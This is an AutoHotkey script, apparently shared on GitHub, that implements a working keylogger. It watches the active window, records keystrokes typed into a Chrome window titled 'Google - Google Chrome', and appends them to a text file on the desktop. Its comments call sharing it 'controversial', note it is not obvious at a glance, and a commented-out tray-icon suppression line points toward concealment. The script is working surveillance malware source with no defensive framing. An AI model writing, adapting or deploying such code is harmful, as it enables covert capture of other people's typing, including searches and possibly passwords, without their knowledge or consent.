; Yes, putting this on github is controversial. 
; But I doubt people will automatically know what it is at first glance.
; I only made this to see if i could do it.

; #NoTrayIcon
#SingleInstance force
#Persistent
global activeWindowTitle := ""
global line := ""

SetTimer, GetActiveWindow, 250
SetTimer, LogTheKeys, 1
Return

GetActiveWindow:
WinGetTitle, title, A
activeWindowTitle := title
Return

LogTheKeys:
If (activeWindowTitle == "Google - Google Chrome") { ; enter window you want to monitor
    Input, storedKeys, L1 V C T5
    line := line . storedKeys
} Else {
    if(line <> "") {
        FileAppend, %line%, C:\Users\Pat\Desktop\some_file_name.txt ; enter file location of stored lines
        ;MsgBox, %line%
    }
    line := ""
}
Return

~!Esc::ExitApp ; alt + esc
return